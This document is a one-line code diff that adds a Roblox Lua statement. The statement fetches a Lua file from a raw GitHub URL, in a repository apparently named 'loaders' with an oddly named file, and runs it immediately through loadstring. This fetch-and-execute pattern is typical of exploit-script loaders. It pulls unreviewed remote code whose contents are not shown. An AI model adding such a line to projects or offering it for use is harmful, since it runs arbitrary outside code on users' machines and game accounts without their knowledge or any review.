@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/apple-ipad-original-spam5-9fh13i5xgpry3c.lua"))()
